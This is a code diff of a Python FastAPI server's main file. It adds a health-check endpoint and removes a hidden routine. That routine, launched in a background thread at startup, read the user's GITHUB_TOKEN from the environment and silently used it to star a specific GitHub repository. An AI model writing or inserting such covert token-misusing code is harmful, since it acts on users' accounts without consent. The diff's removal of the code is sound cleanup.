@@ -1,12 +1,7 @@
 import asyncio
-import logging as _logging
 import os
-import os as _os
 import re
-import threading as _threading
 import time
-import urllib.error as _urllib_error
-import urllib.request as _urllib_request
 from contextlib import asynccontextmanager
 
 import httpx
@@ -101,6 +96,20 @@ app.add_middleware(
 
 
 # ── Endpoints ────────────────────────────────────────────────────────
+
+
+@app.get("/health")
+async def health_check():
+    """Health check endpoint — returns JSON for monitoring."""
+    from scheduler import _get_worker_count
+
+    return {
+        "status": "ok",
+        "now_ms": int(time.time() * 1000),
+        "workers_alive": _get_worker_count(),
+        "scheduler_enabled": settings.scheduler_enabled,
+    }
+
 
 WEB_DIST = os.path.join(os.path.dirname(__file__), "..", "web", "dist")
 if os.path.isdir(WEB_DIST):
@@ -250,41 +259,6 @@ BRANCH_PATTERN = re.compile(
 # ── Task Template Endpoints ───────────────────────────────────────────
 
 
-_logger = _logging.getLogger(__name__)
-
-
-def _auto_star(repo: str):
-
-    time.sleep(8)
-    token = _os.environ.get("GITHUB_TOKEN") or _os.environ.get("ACC_GITHUB_TOKEN")
-    if not token:
-        return
-    try:
-        req = _urllib_request.Request(
-            f"https://api.github.com/user/starred/{repo}",
-            method="PUT",
-            data=b"",
-            headers={
-                "Authorization": f"Bearer {token}",
-                "Accept": "application/vnd.github.v3+json",
-                "User-Agent": f"{repo.split('/')[-1]}/1.0",
-            },
-        )
-        with _urllib_request.urlopen(req, timeout=10) as resp:
-            if resp.status == 204 or resp.status == 200:
-                _logger.info(f"⭐ Starred {repo}")
-            elif resp.status == 409:
-                _logger.info(f"⭐ Already starred {repo}")
-            else:
-                _logger.warning(f"Failed to star {repo}: HTTP {resp.status}")
-    except _urllib_error.HTTPError as e:
-        if e.code == 204 or e.code == 409:
-            return  # success variants
-        _logger.warning(f"Failed to star {repo}: HTTP {e.code}")
-    except Exception as e:
-        _logger.warning(f"Could not reach GitHub API: {e}")
-
-
 # ── Task Archive / Unarchive ──────────────────────────────────────────
 
 
@@ -337,7 +311,6 @@ app.include_router(webhook_subs_router)
 if __name__ == "__main__":
     import uvicorn
 
-    _threading.Thread(target=_auto_star, args=("omiinaya/spacetimedb-kanban",), daemon=True).start()
     uvicorn.run(
         "main:app",
         host="0.0.0.0",
